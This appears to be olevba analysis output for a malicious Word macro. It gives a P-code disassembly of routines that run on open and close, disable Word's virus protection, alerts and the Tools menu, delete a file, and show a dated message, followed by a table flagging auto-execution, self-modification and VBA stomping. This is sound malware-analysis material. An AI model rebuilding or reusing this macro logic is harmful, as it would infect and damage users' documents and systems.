' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Label Label_Exit 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Public Sub AutoExec())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #58:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub AutoExit())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitStr 0x000C "c:\bdoc2.txt"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #65:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "ЗлК№УГµБ°жИнјю,Press OK!!"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #66:
' 	EndSub 
' Line #67:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

